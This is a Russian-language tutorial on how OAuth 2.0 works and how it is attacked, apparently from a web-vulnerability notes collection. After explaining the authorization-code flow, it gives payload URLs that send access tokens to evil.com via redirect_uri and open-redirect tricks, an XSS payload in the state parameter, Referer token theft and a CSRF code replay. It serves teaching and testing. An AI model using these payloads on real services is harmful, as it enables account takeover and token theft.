> **OAuth** — это широко используемая структура авторизации, которая позволяет веб-сайтам и веб-приложениям запрашивать ограниченный доступ к учетной записи пользователя в другом приложении. Что особенно важно, OAuth позволяет пользователю предоставлять этот доступ, не раскрывая свои учетные данные для входа запрашивающему приложению. Это означает, что пользователи могут точно настраивать, какими данными они хотят поделиться, вместо того, чтобы передавать полный контроль над своей учетной записью третьей стороне.

*  [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
*  [Перехват токена OAuth через redirect_uri](#Перехват-токена-OAuth-через-redirect_uri)
*  [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
*  [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
*  [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)
*  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)

# Базовая базО

### Как работает OAuth 2.0?

* Клиентское приложение — веб-сайт или веб-приложение, которое хочет получить доступ к данным пользователя.
* Владелец ресурса — пользователь, к данным которого клиентское приложение хочет получить доступ.
* Поставщик услуг OAuth — веб-сайт или приложение, которое контролирует данные пользователя и доступ к ним. Они поддерживают OAuth, предоставляя API для взаимодействия как с сервером авторизации, так и с сервером ресурсов.

Существует множество различных способов реализации фактического процесса OAuth. Они известны как «потоки» OAuth или «типы предоставления».

```«код авторизации»``` и ```«неявный»``` типаы предоставления в целом включают следующие этапы:

1. Клиентское приложение запрашивает доступ к подмножеству данных пользователя, указывая, какой тип предоставления он хочет использовать и какой вид доступа он хочет.
2. Пользователю предлагается войти в службу OAuth и явно дать свое согласие на запрошенный доступ.
3. Клиентское приложение получает уникальный токен доступа, который подтверждает, что у него есть разрешение от пользователя на доступ к запрошенным данным. То, как именно это происходит, значительно различается в зависимости от типа предоставления.
4. Клиентское приложение использует этот токен доступа для выполнения вызовов API, извлекая соответствующие данные с сервера ресурсов.

> Хотя OAuth 2.0 является текущим стандартом, некоторые веб-сайты по-прежнему используют устаревшую версию 1a. OAuth 2.0 был написан с нуля, а не разработан непосредственно на основе OAuth 1.0. 

* **Области действия OAuth**

> Поскольку имя области действия представляет собой просто произвольную текстовую строку, формат может существенно различаться у разных поставщиков. Некоторые даже используют полный URI в качестве имени области действия, аналогично конечной точке REST API.

Запрос доступа на чтение к списку контактов:
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

## Тип предоставления кода авторизации
* [Запрос авторизации](#1Запрос-авторизации)
* [](#)
* [](#)
* [](#)
* [](#)
* [](#)
* [](#)
![Тип предоставления кода авторизации](https://github.com/Kaupervud69/WebVuln/blob/main/OAuth/jpeg/oauth-authorization-code-flow.jpg "authcode")

### 1.**Запрос авторизации**

Клиентское приложение отправляет запрос в конечную точку /authorization службы OAuth, запрашивая разрешение на доступ к определенным данным пользователя. 
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Хост: oauth-authorization-server.com
```
Этот запрос содержит следующие важные параметры, обычно предоставляемые в строке запроса:

* ```client_id``` - Обязательный параметр, содержащий уникальный идентификатор клиентского приложения. Это значение генерируется, когда клиентское приложение регистрируется в службе OAuth.
* ```redirect_uri``` - URI, на который должен быть перенаправлен браузер пользователя при отправке кода авторизации клиентскому приложению. Это также известно как «Callback URI» или «Callback Endpoint».
> Многие атаки OAuth основаны на использовании недостатков в проверке этого параметра.
* ```response_type``` - Определяет, какой тип ответа ожидает клиентское приложение и, следовательно, какой поток оно хочет инициировать. Для типа предоставления кода авторизации значение должно быть code.
* ```scope``` - К какому подмножеству данных пользователя клиентское приложение хочет получить доступ. Это могут быть пользовательские области, установленные поставщиком OAuth, или стандартизированные области, определенные спецификацией ```OpenID Connect```.
* ```state``` - уникальное, не поддающееся угадыванию значение, привязанное к текущему сеансу клиентского приложения.
> Служба OAuth должна возвращать это точное значение в ответе вместе с кодом авторизации. Этот параметр служит формой токена CSRF для клиентского приложения, гарантируя, что запрос к его конечной точке /callback исходит от того же человека, который инициировал поток OAuth.

### 2. **Вход пользователя и согласие**

Когда сервер авторизации получает первоначальный запрос, он перенаправляет пользователя на страницу входа, где ему будет предложено войти в свою учетную запись у поставщика OAuth. (Vk/OK/Google)Затем им будет представлен список данных, к которым клиентское приложение хочет получить доступ. Это основано на областях, определенных в запросе авторизации.

### 3. **Предоставление кода авторизации**

Если пользователь соглашается на запрошенный доступ, его браузер будет перенаправлен на конечную точку /callback, указанную в параметре redirect_uri запроса авторизации. Результирующий запрос GET будет содержать код авторизации в качестве параметра запроса.
```
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Хост: client-app.com
```
### 4. **Запрос токена доступа**

После того, как клиентское приложение получает код авторизации, ему необходимо обменять его на токен доступа. Для этого оно отправляет запрос POST с сервера на сервер на конечную точку /token сервиса OAuth. Все коммуникации с этого момента происходят в защищенном обратном канале и, следовательно, обычно не могут быть отслежены или проконтролированы пользователем.
```
POST /token HTTP/1.1
Хост: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```
В дополнение к client_id и коду авторизации вы заметите следующие новые параметры:

* ```client_secret``` - Клиентское приложение должно аутентифицировать себя, включив секретный ключ, который был назначен ему при регистрации в службе OAuth.
* ```grant_type``` - Используется для того, чтобы убедиться, что новая конечная точка знает, какой тип предоставления клиентское приложение хочет использовать. В этом случае это должно быть установлено как authorization_code.

### 5. **Предоставление токена доступа**

Служба OAuth проверит запрос токена доступа. Если все так, как ожидалось, сервер отвечает, предоставляя клиентскому приложению токен доступа с запрошенной областью действия.
```
{
"access_token": "z0y9x8w7v6u5",
"token_type": "Bearer",
"expires_in": 3600,
"scope": "openid profile",
…
}
```
### 6. **Вызов API**

Теперь у клиентского приложения есть код доступа, оно наконец может получить данные пользователя с сервера ресурсов. Для этого оно выполняет вызов API к конечной точке /userinfo службы OAuth. Токен доступа отправляется в заголовке Authorization: Bearer, чтобы подтвердить, что у клиентского приложения есть разрешение на доступ к этим данным.
```
GET /userinfo HTTP/1.1
Хост: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```
### 7. **Предоставление ресурса**

Сервер ресурсов должен проверить, что токен действителен и принадлежит текущему клиентскому приложению. Если это так, он ответит, отправив запрошенный ресурс, т. е. данные пользователя, на основе области действия токена доступа.
```
{
"username":"user",
"email":"user@sobaken.net",
…
}
```
Клиентское приложение наконец-то может использовать эти данные по назначению. В случае аутентификации OAuth они обычно используются как идентификатор для предоставления пользователю аутентифицированного сеанса, фактически регистрируя его.
















# Кража токена OAuth через Referer

> У вас есть HTML-инъекция, но не получается выполнить XSS? На сайте есть реализации OAuth? Если да, настройте тег `img` на свой сервер и посмотрите, есть ли способ заставить жертву перейти туда (редирект и т.д.) после входа в систему, чтобы украсть OAuth-токены через заголовок referer.

# Перехват токена OAuth через `redirect_uri`

**Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

**Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

# Выполнение XSS через `redirect_uri`
```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

# Раскрытие закрытого ключа OAuth
Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.

# Нарушение правил использования authorization code
> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.

# Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.
